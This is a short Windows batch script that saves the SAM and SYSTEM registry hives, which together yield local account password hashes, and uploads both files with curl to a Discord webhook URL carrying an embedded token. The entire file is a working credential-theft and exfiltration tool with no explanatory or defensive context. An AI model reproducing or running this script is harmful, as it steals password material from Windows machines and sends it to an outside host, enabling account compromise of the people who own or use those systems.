@echo off
powershell -Command "reg save HKLM\sam C:\Users\sam"
powershell -Command "reg save HKLM\system C:\Users\system"
cd C:\Users\
powershell -Command "curl -F "file1=@sam" https://discord.com/api/webhooks/1299082529978056754/ZuE8fApEDp8DbkSHuNEwwGa4XeOGG4vB-gXkyfBhZmcQ5UuWHup_xO-Tr9M5KXdZbB_Z"
powershell -Command "curl -F "file2=@system" https://discord.com/api/webhooks/1299082529978056754/ZuE8fApEDp8DbkSHuNEwwGa4XeOGG4vB-gXkyfBhZmcQ5UuWHup_xO-Tr9M5KXdZbB_Z"
